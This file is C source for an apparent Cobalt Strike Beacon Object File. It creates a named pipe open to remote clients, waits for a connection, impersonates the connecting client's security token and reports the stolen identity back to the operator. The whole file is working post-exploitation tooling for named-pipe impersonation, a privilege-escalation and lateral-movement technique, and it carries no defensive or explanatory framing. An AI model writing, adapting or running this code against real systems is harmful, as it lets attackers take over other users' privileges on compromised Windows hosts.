#include <windows.h>
#include <stdio.h>
#include "beacon.h"
void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *pipeNameShort = BeaconDataExtract(&parser, NULL);
    int timeoutSec = BeaconDataInt(&parser);
    if (!pipeNameShort || !*pipeNameShort) { BeaconPrintf(CALLBACK_ERROR, "[!] Usage: bof pipe_server z:<name> [i:<timeout>]\n"); return; }
    if (timeoutSec <= 0 || timeoutSec > 3600) timeoutSec = 30;
    char pipePath[256];
    _snprintf(pipePath, sizeof(pipePath), "\\\\.\\pipe\\%s", pipeNameShort);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Creating pipe: %s (timeout=%ds)\n", pipePath, timeoutSec);
    HANDLE hPipe = CreateNamedPipeA(pipePath, PIPE_ACCESS_INBOUND|FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE|PIPE_READMODE_BYTE|PIPE_WAIT|PIPE_ACCEPT_REMOTE_CLIENTS, 1, 4096, 4096, 0, NULL);
    if (hPipe == INVALID_HANDLE_VALUE) { BeaconPrintf(CALLBACK_ERROR, "[!] CreateNamedPipeA failed\n"); return; }
    OVERLAPPED ov = {0};
    ov.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hPipe, &ov);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Waiting for connection...\n");
    DWORD wr = WaitForSingleObject(ov.hEvent, timeoutSec*1000);
    if (wr == WAIT_TIMEOUT) { BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout\n"); CloseHandle(ov.hEvent); CloseHandle(hPipe); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Client connected\n");
    if (ImpersonateNamedPipeClient(hPipe)) {
        char userName[256]={0}; DWORD nameLen=sizeof(userName);
        if (GetUserNameA(userName, &nameLen))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonated: %s\n", userName);
        RevertToSelf();
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] ImpersonateNamedPipeClient failed\n");
    }
    DisconnectNamedPipe(hPipe); CloseHandle(ov.hEvent); CloseHandle(hPipe);
}
